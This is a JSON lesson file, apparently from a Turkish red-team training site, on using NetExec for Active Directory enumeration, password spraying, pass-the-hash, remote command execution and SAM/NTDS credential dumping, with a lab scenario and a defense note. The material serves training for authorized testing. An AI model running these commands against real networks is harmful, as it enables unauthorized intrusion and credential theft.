@@ -1,0 +1,124 @@
+{
+  "id": "netexec",
+  "slug": "netexec",
+  "title": "NetExec (CrackMapExec)",
+  "subtitle": "İç Ağ Numaralandırma ve Yanal Hareket",
+  "description": "NetExec (CrackMapExec'in devamı), iç ağlarda SMB, WinRM, LDAP, MSSQL gibi protokoller üzerinden numaralandırma, kimlik doğrulama ve yanal hareket için kullanılan çok yönlü bir araçtır.",
+  "team": "red-team",
+  "category": "Active Directory",
+  "phase": "Post-Exploitation",
+  "icon": "🔪",
+  "color": "#ef4444",
+  "tags": ["netexec", "crackmapexec", "nxc", "smb", "lateral movement", "pass-the-hash", "ad"],
+  "modules": [
+    {
+      "id": "basics",
+      "title": "Temeller ve Numaralandırma",
+      "description": "NetExec ne yapar, kurulum ve temel SMB enumeration",
+      "difficulty": "intermediate",
+      "duration": "25 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "NetExec'i Anlamak",
+          "content": "**NetExec (nxc)**, iç ağ pentest'inin 'İsviçre çakısı'dır. Tek araçla birçok protokol üzerinden çalışır: smb, winrm, ldap, mssql, ssh, rdp, ftp.\n\n**Ne işe yarar?**\n- Kimlik bilgisi doğrulama (geçerli mi?)\n- Paylaşım, kullanıcı, parola politikası numaralandırma\n- Komut çalıştırma (yanal hareket)\n- Credential dumping (SAM, LSA, NTDS)\n- Pass-the-Hash / Pass-the-Ticket\n- Relay hedef listesi üretme\n\n**Renk kodu:** Çıktıda `[+]` geçerli kimlik, `(Pwn3d!)` ise o hostta yönetici/komut çalıştırma yetkisi demektir — yanal hareket için yeşil ışık.\n\n**AD pentest akışı:** Bir kimlik bilgisi elde edince nxc ile tüm ağda dene (spraying), Pwn3d! olan hostlarda komut çalıştır."
+        },
+        {
+          "id": "installation",
+          "type": "installation",
+          "title": "Kurulum",
+          "installation": {
+            "note": "CrackMapExec artık NetExec olarak geliştiriliyor.",
+            "linux": ["pipx install netexec", "nxc smb --help"]
+          }
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Numaralandırma",
+          "commands": [
+            {
+              "command": "netexec smb 10.10.10.0/24 -u kullanici -p 'Parola1' --shares",
+              "description": "Tüm subnet'te kimlik doğrula ve paylaşımları listele",
+              "output": "SMB  10.10.10.5  [+] CORP\\kullanici:Parola1\nSMB  10.10.10.8  [+] (Pwn3d!)",
+              "tip": "(Pwn3d!) = o hostta admin yetkin var. Sonraki adım: -x ile komut çalıştır.",
+              "flags": [
+                { "flag": "-u / -p", "description": "Kullanıcı / parola" },
+                { "flag": "-H", "description": "NTLM hash (Pass-the-Hash)" },
+                { "flag": "--shares", "description": "Paylaşımları listele" },
+                { "flag": "--users", "description": "Domain kullanıcıları" }
+              ]
+            },
+            {
+              "command": "netexec smb 10.10.10.1 -u user -p pass --users --pass-pol",
+              "description": "Domain kullanıcılarını ve parola politikasını çek",
+              "tip": "Parola politikası (kilitlenme eşiği) spraying öncesi kritiktir."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "advanced",
+      "title": "Yanal Hareket, PtH ve Lab",
+      "description": "Komut çalıştırma, Pass-the-Hash, credential dump ve pratik",
+      "difficulty": "advanced",
+      "duration": "30 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Yanal Hareket & Dump",
+          "commands": [
+            {
+              "command": "netexec smb 10.10.10.8 -u admin -p 'Parola1' -x 'whoami'",
+              "description": "Uzak hostta komut çalıştır (yanal hareket)",
+              "tip": "-X ile PowerShell komutu çalıştırılır. Pwn3d! olan hostlarda çalışır.",
+              "flags": [
+                { "flag": "-x", "description": "CMD komutu çalıştır" },
+                { "flag": "-X", "description": "PowerShell komutu" }
+              ]
+            },
+            {
+              "command": "netexec smb 10.10.10.8 -u admin -H 'aad3b435...:31d6cfe0...' --sam",
+              "description": "Pass-the-Hash ile kimlik doğrula ve SAM hash'lerini dump et",
+              "tip": "-H ile parola yerine NTLM hash kullanılır (PtH). --sam yerel hash'leri, --ntds domain hash'lerini çeker.",
+              "warning": "Yalnızca yetkili AD pentest/lab ortamında."
+            },
+            {
+              "command": "netexec smb 10.10.10.0/24 -u user -p 'Yaz2024!' --continue-on-success",
+              "description": "Password spraying — başarıda durmadan tüm hostları dene",
+              "tip": "Spraying: tek parola, çok kullanıcı/host. Kilitlenme eşiğine dikkat et."
+            }
+          ]
+        },
+        {
+          "id": "lab",
+          "type": "lab",
+          "title": "CTF Senaryosu: İç Ağda Yayılma",
+          "scenario": {
+            "title": "Kimlik Doğrula → Pwn3d! → Yanal Hareket → Dump",
+            "objective": "Elde ettiğin bir kimlik bilgisiyle ağı tara, yönetici yetkin olan hostları bul, komut çalıştır ve credential dump ile yeni hesaplar ele geçir.",
+            "environment": "AD lab (GOAD) veya HTB AD makinesi",
+            "difficulty": "advanced",
+            "steps": [
+              "Kimlik bilgisini doğrula: netexec smb SUBNET -u user -p pass",
+              "(Pwn3d!) olan hostları belirle",
+              "Komut çalıştır: netexec smb HOST -u user -p pass -x 'whoami /all'",
+              "Hash dump: netexec smb HOST -u user -p pass --sam (veya --ntds DC'de)",
+              "Yeni hash'lerle Pass-the-Hash yaparak başka hostlara yayıl",
+              "Domain Admin'e ulaşana kadar BloodHound rotasını takip et"
+            ],
+            "hints": [
+              "Pwn3d! görmüyorsan o kimlikle o hostta admin değilsin",
+              "--ntds yalnızca Domain Controller'da ve DA yetkisiyle çalışır",
+              "Spraying'i parola politikasını öğrendikten sonra yap"
+            ],
+            "defenseNote": "Savunma: Yerel admin parolalarını LAPS ile benzersizleştir, Pass-the-Hash'i kısıtla (Credential Guard), ağ segmentasyonu, ayrıcalıklı hesap kullanımını izle ve anormal SMB komut çalıştırmayı SIEM ile yakala."
+          }
+        }
+      ]
+    }
+  ]
+}
